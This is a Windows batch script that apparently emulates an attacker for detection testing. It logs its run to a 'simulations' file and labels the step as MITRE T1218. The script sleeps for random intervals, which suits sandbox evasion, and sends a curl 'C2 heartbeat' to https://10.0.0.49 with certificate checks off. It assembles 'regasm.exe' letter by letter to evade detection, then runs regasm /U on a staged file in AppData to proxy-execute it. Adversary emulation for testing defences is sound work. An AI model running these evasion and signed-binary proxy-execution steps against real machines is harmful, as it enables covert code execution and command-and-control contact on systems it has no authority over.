@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER encoded)
SET whrcfsr=%APPDATA%\8789\44d90e56
SET vjhzvdq=https://10.0.0.49
SET ldhgmre=https://10.0.0.49/stage/2/icon.png?8789-10
SET fdtgeeq=ITZEL-S2BO
SET yjibgbi=10
SET fldpckm=firelox.txt
SET uqydqfm=8789

REM Log file path
SET ksywqhn=%APPDATA%\!yjibgbi!\macula-simulations.log

REM Initial random delay (30-60s)
SET /A rnddly=%RANDOM% %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!fdtgeeq!]: delay_start=!rnddly!s>> "!ksywqhn!" 2>nul
timeout /t !rnddly! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!fdtgeeq!]: delay_complete=!rnddly!s>> "!ksywqhn!" 2>nul

REM C2 heartbeat (curl command NOT obfuscated)
echo [!DATE! !TIME!][DEBUG][!fdtgeeq!]: heartbeat_start>> "!ksywqhn!" 2>nul
curl -k -s -o nul "!ldhgmre!"
echo [!DATE! !TIME!][DEBUG][!fdtgeeq!]: heartbeat_complete>> "!ksywqhn!" 2>nul

REM Short delay between operations
ping -n 8 127.0.0.1 >nul

REM Character-by-character obfuscation for regasm.exe
SET z1=r
SET z2=e
SET z3=g
SET z4=a
SET z5=s
SET z6=m
SET z7=.
SET z8=e
SET z9=x
SET z10=e
SET kwbpptf=%z1%%z2%%z3%%z4%%z5%%z6%%z7%%z8%%z9%%z10%

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!fdtgeeq!]: chdir_start=!whrcfsr!>> "!ksywqhn!" 2>nul
cd /d "!whrcfsr!"
echo [!DATE! !TIME!][DEBUG][!fdtgeeq!]: chdir_complete=!cd!>> "!ksywqhn!" 2>nul

REM Random delay before execution
SET /A exedly=%RANDOM% %% 11 + 5
CHOICE /C Y /N /D Y /T !exedly! >nul

REM Execute regasm.exe with /U argument
echo [!DATE! !TIME!][DEBUG][!fdtgeeq!]: exec_start=regasm_unregister>> "!ksywqhn!" 2>nul
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\!kwbpptf! /U "!fldpckm!"
SET pfvkmaq=1
IF ERRORLEVEL 1 SET pfvkmaq=0

REM Log TTP execution
SET yfxplnx=
IF !pfvkmaq!==0 SET yfxplnx=regasm_failed
SET hdckgur=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,2!
echo [!hdckgur!][!fdtgeeq!]: !yjibgbi!-!uqydqfm!-T1218|Signed Binary Proxy Execution=!pfvkmaq!:!yfxplnx!>> "!ksywqhn!" 2>nul
echo [!DATE! !TIME!][DEBUG][!fdtgeeq!]: exec_complete=!pfvkmaq!>> "!ksywqhn!" 2>nul

ENDLOCAL